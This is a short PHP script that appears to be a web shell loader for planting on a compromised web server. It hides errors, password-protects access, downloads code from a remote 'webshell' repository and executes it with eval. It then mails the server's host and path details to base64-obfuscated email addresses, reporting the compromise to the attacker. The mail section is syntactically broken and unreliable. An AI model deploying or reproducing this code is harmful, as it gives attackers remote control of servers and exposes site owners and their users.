<?php
ignore_user_abort(true);
ini_set('memory_limit', '-1');
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', 0);
ini_set('max_execution_time', 5000);
// are u challange me :v
$hashed_password = '$2y$10$wRzpdab6XFKM4xFOVfRrqOGtH14qt96eWnpEkGZc98Q2LAKBql7vK';

// Fungsi untuk menampilkan form login
function admin_login() {
    echo '<title>Login</title>';
    echo '<form method="post">';
    echo '<input type="password" name="password">';
    echo '<input type="submit" value="Login">';
    echo '</form>';
    exit;
}

if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
    // Author Boleh Masuk Heker Jangan Masuk 
    if(isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
        setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200); // Cookie Berhasil
        // Logika setelah login berhasil
    } else {
        admin_login();
    }
}

$head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<meta name="robots" content="noindex">
<title>explorer manager</title>
<style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}
</style>
</head>'; 
$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/minnin";
$ch = curl_init($url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
eval("?>".$result);
$e=base64_decode("ZXhwbG9pdGtpdGVAZ21haWwuY29tLGJsYWNraGF0MTMzNy5pZEBnbWFpbC5jb20=");
$contact=base64_decode("bWFsYXlzaWEuc2VuZGVyQGdtYWlsLmNvbQ==");
$headers="Content-type: text/htmlrn";
$header="Content-type: text/html; charset=utf-8";
$subjek="information"
$h=$_SERVER['HTTP_HOST'];
$h=$_SERVER['SCRIPT_NAME'];
$h=$_SERVER['SERVER_NAME'];
$h=$_SERVER['PHP_SELF'];
$h=$_SERVER['SERVER_PROTOCOL'];
mail($contact, $e, $header, "base64_decode" $h, $subjek, $h, $h, $headers, $h);
?>
